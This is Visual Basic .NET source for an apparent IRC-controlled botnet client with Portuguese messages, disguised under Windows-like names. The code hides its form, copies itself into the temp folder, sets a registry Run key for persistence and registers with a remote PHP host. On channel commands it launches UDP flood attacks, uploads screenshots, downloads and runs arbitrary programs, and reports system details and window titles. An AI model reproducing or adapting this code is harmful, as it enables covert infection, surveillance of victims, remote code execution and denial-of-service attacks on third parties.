Imports System.Drawing
Imports System.Net
Imports System.Net.Sockets
Imports System.IO
Imports Microsoft.Win32
Imports System
Imports System.Text.ASCIIEncoding

Public Class Wincpp
    Dim httpclient As WebClient
    Dim CONFIG_CANAL As String = "#jhv53gv4HLKHB658"
    Dim CONFIG_SERVER As String = "irc.freenode.net"
    Dim CONFIG_PORT As Int32 = 6667
    Dim CONFIG_URI As String = "http://afrodite.pe.hu/"
    Dim trd As Threading.Thread
    Dim dos As Threading.Thread
    Dim sock As New TcpClient()
    Dim input As TextReader
    Dim output As TextWriter
    Dim nick As String
    Dim buf As String
    Dim separador As Char
    Dim os As String
    Dim plataforma As String
    Dim versao As String
    Dim mvirtual As String
    Dim mfisica As String
    Dim o As Object
    Dim url As String
    Dim threads As Integer
    Dim pt As String

    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer

    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function

    Sub ddos()
        Do
            Try
                Dim GLOIP As IPAddress
                Dim bytCommand As Byte() = New Byte() {}
                GLOIP = IPAddress.Parse(url)
                bytCommand = ASCII.GetBytes("$$$$$$$$$$$$$$$$$$$$")
                Do
                    Dim udp As New UdpClient
                    udp.Connect(GLOIP, pt)
                    udp.Send(bytCommand, bytCommand.Length)
                    udp.Close()
                Loop
            Catch ex As Exception
                Exit Do
            End Try
        Loop
    End Sub


    Sub looping()
        For i = 0 To threads - 1
            dos = New Threading.Thread(AddressOf ddos)
            dos.Start()
        Next


    End Sub

    Sub Infect()
        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\Hosting",
"Name", Nothing) Is Nothing Then
            Dim r As Random = New Random
            nick = (My.Computer.Name & "_" & (r.Next(0, 99999)).ToString)
            Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows", True)
            Dim newkey As RegistryKey = key.CreateSubKey("Hosting")
            newkey.SetValue("Name", nick)
            o = CreateObject("InternetExplorer.Application")
            o.navigate2(CONFIG_URI & "reg.php?n=" & nick)
            FileCopy(System.Reflection.Assembly.GetExecutingAssembly().Location, (Path.GetTempPath() & "WindowsHosting.exe"))
            Dim start As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            start.SetValue("WINH", (Path.GetTempPath() & "WindowsHosting.exe"))
            Process.Start(Path.GetTempPath & "WindowsHosting.exe")
            Application.Exit()
        Else
            Dim pRegKey As RegistryKey = Registry.CurrentUser
            pRegKey = pRegKey.OpenSubKey("Software\Microsoft\Windows\WinH")
            Dim val As Object = pRegKey.GetValue("Name")
            nick = val
            o = CreateObject("InternetExplorer.Application")
            o.navigate2(CONFIG_URI & "update.php?n=" & nick)
        End If
    End Sub

    Sub getInfo()
        os = My.Computer.Info.OSFullName
        versao = My.Computer.Info.OSVersion
        plataforma = My.Computer.Info.OSPlatform
        mvirtual = My.Computer.Info.TotalVirtualMemory
        mfisica = My.Computer.Info.TotalPhysicalMemory
    End Sub

    Sub connect()
        sock.Connect(CONFIG_SERVER, CONFIG_PORT)
        input = New StreamReader(sock.GetStream())
        output = New StreamWriter(sock.GetStream())
    End Sub

    Sub logar()
        output.Write("USER " & nick & " 0 * :" & nick & vbCr & vbLf & "NICK " & nick & vbCr & vbLf & "JOIN " & CONFIG_CANAL & vbCr & vbLf)
        output.Flush()
        buf = input.Read()
        System.Threading.Thread.Sleep(4000)
    End Sub

    Sub mbox(ByVal corpo As String, titulo As String)
        MsgBox(corpo, MsgBoxStyle.OkOnly, titulo)
    End Sub

    Sub Main()
        Infect()
        getInfo()
        connect()
        logar()

        Dim login As Boolean = False

        While login = False
            buf = input.ReadLine()
            If (buf.StartsWith("PING ")) Then
                output.Write(buf.Replace("PING", "PONG") & vbCr & vbLf)
                output.Flush()
            Else
                Dim args As String() = buf.Split("$")
                If (args.Length > 1) Then
                    If (args(1) = "ligar 123456") Then
                        output.Write("PRIVMSG " & CONFIG_CANAL & " : [+] Ligado com sucesso" & vbCr & vbLf)
                        output.Flush()
                        login = True
                        Exit While
                    End If
                End If
            End If
        End While

        While True
            buf = input.ReadLine()
            If (buf.StartsWith("PING ")) Then
                output.Write(buf.Replace("PING", "PONG") & vbCr & vbLf)
                output.Flush()
            Else
                Try
                    Dim args As String() = buf.Split("$")
                    Select Case True
                        Case args(1).StartsWith("info")
                            Dim temp As String() = args(1).Split(" ")
                            If (temp(1) = nick) Then
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :************************************************" & vbCr & vbLf)
                                output.Flush()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :* Sistema Operacional: " & os & vbCr & vbLf)
                                output.Flush()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :* Versao: " & versao & vbCr & vbLf)
                                output.Flush()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :* Plataforma: " & plataforma & vbCr & vbLf)
                                output.Flush()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :* Memoria virtual: " & mvirtual & vbCr & vbLf)
                                output.Flush()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :* Memoria fisica: " & mfisica & vbCr & vbLf)
                                output.Flush()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " :************************************************" & vbCr & vbLf)
                                output.Flush()
                            End If
                            Continue While
                        Case args(1).StartsWith("online")
                            output.Write("PRIVMSG " & CONFIG_CANAL & " : [+] " & nick & vbCr & vbLf)
                            output.Flush()
                            Continue While
                        Case args(1).StartsWith("ddos")
                            Dim temp As String() = args(1).Split(" ")
                            Dim temp2 As String() = temp(1).Split("|")
                            If (temp2(0) = nick Or temp2(0) = "all") Then
                                url = temp2(1)
                                pt = temp2(2)
                                threads = (temp2(3).Replace(vbCr & vbLf, "")).Replace("\r\n", "")
                                output.Write("PRIVMSG " & CONFIG_CANAL & " : [+] dDoS iniciado com sucesso!" & vbCr & vbLf)
                                output.Flush()
                                looping()
                            End If
                        Case args(1).StartsWith("screenshot")
                            Dim temp As String() = args(1).Split(" ")
                            If (temp(1) = nick Or temp(1) = "all") Then
                                Dim bounds As Rectangle
                                Dim screenshot As Bitmap
                                Dim graph As Graphics
                                bounds = Screen.PrimaryScreen.Bounds
                                screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
                                graph = Graphics.FromImage(screenshot)
                                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
                                screenshot.Save((Path.GetTempPath & "screenshot.jpg"), Imaging.ImageFormat.Jpeg)
                                My.Computer.Network.UploadFile((Path.GetTempPath & "screenshot.jpg"), CONFIG_URI & "screen.php")
                                output.Write("PRIVMSG " & CONFIG_CANAL & " : [+] Screenshot realizada com sucesso!" & vbCr & vbLf)
                                output.Flush()
                            End If
                            Continue While
                        Case args(1).StartsWith("executar")
                            Dim temp As String() = args(1).Split(" ")
                            Dim temp2 As String() = temp(1).Split("|")
                            If (temp2(0) = nick Or temp2(0) = "all") Then
                                Dim url As String = temp2(1)
                                Dim name As String = temp(2)
                                My.Computer.Network.DownloadFile(url, name)
                                Process.Start(Path.GetTempPath & name)
                                output.Write("PRIVMSG " & CONFIG_CANAL & " : [+] Arquivo executado com sucesso!")
                                output.Flush()
                            End If
                        Case args(1).StartsWith("msgbox")
                            Dim temp As String() = args(1).Split(" ")
                            Dim temp2 As String() = temp(1).Split("|")
                            If (temp2(0) = nick Or temp2(0) = "all") Then
                                Dim titulo As String = temp2(1).Replace("-", "")
                                Dim corpo As String = temp2(2).Replace("-", "")
                                dos = New Threading.Thread(Sub() mbox(titulo, corpo))
                                dos.Start()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " : [+] Mensagem exibida com sucesso!" & vbCr & vbLf)
                                output.Flush()
                            End If
                        Case args(1).StartsWith("janela")
                            Dim temp As String() = args(1).Split(" ")
                            If (temp(1) = nick Or temp(1) = "all") Then
                                Dim janela As String = GetCaption()
                                output.Write("PRIVMSG " & CONFIG_CANAL & " : [" & nick & "] " & janela & vbCr & vbLf)
                                output.Flush()
                            End If
                    End Select
                Catch ex As Exception
                    Continue While
                End Try
            End If
        End While

    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        Main()
    End Sub

    Private Sub Wincpp_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub
End Class
